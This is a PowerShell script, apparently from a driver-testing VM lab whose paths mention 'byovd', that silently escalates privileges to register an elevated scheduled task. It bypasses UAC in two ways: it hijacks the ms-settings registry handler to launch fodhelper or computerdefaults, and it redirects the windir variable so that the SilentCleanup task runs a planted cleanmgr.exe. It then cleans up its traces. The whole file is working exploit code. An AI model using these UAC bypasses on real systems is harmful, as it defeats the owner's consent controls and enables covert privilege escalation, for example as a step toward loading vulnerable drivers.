# Run inside DriverLab via Guest Control (medium IL). Auto-elevates with no UAC prompt on headless VM.
$ErrorActionPreference = 'Continue'
$reg = 'Z:\byovd\driver3\register-driver3-elevated-task.ps1'
$payload = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$reg`""
$marker = 'C:\DriverLab\guest-autoelevate.log'
New-Item -ItemType Directory -Force -Path 'C:\DriverLab' | Out-Null
function Log($m) { Add-Content $marker "$(Get-Date -Format o) $m"; Write-Host $m }

function Test-Worker {
    schtasks /Query /TN Driver3ElevatedWorker 2>$null | Out-Null
    return ($LASTEXITCODE -eq 0)
}

if (Test-Worker) { Log 'already registered'; exit 0 }

# --- method 1: ms-settings autoElevate (fodhelper / computerdefaults) ---
$key = 'HKCU:\Software\Classes\ms-settings\Shell\open\command'
New-Item $key -Force | Out-Null
New-ItemProperty -Path $key -Name DelegateExecute -Value '' -Force | Out-Null
Set-ItemProperty -Path $key -Name '(default)' -Value $payload -Force
foreach ($exe in @(
        "$env:SystemRoot\System32\fodhelper.exe",
        "$env:SystemRoot\System32\computerdefaults.exe"
    )) {
    if (-not (Test-Path $exe)) { continue }
    Log "start $exe"
    Start-Process $exe -WindowStyle Hidden
    for ($i = 0; $i -lt 12; $i++) {
        Start-Sleep -Seconds 2
        if (Test-Worker) {
            Remove-Item 'HKCU:\Software\Classes\ms-settings' -Recurse -Force -ErrorAction SilentlyContinue
            Log 'worker ok via ms-settings'
            exit 0
        }
    }
}
Remove-Item 'HKCU:\Software\Classes\ms-settings' -Recurse -Force -ErrorAction SilentlyContinue

# --- method 2: SilentCleanup windir hijack ---
$helper = @(
    'Z:\driver-lab\vm\bin\GuestElevateOnce.exe',
    'D:\hostdev\driver-lab\vm\bin\GuestElevateOnce.exe'
) | Where-Object { Test-Path $_ } | Select-Object -First 1
if ($helper) {
    $hijack = Join-Path $env:TEMP 'dl-windir'
    New-Item -ItemType Directory -Force -Path (Join-Path $hijack 'system32') | Out-Null
    Copy-Item $helper (Join-Path $hijack 'system32\cleanmgr.exe') -Force
    [Environment]::SetEnvironmentVariable('windir', $hijack, 'User')
    $env:windir = $hijack
    Log 'SilentCleanup'
    schtasks /Run /TN '\Microsoft\Windows\DiskCleanup\SilentCleanup' | Out-Null
    for ($i = 0; $i -lt 15; $i++) {
        Start-Sleep -Seconds 2
        if (Test-Worker) {
            [Environment]::SetEnvironmentVariable('windir', $null, 'User')
            Log 'worker ok via SilentCleanup'
            exit 0
        }
        if (Test-Path 'C:\DriverLab\guest-elevated.json') {
            Log (Get-Content 'C:\DriverLab\guest-elevated.json' -Raw)
            if (Test-Worker) { [Environment]::SetEnvironmentVariable('windir', $null, 'User'); exit 0 }
        }
    }
    [Environment]::SetEnvironmentVariable('windir', $null, 'User')
}

Log 'FAILED auto-elevate'
exit 1
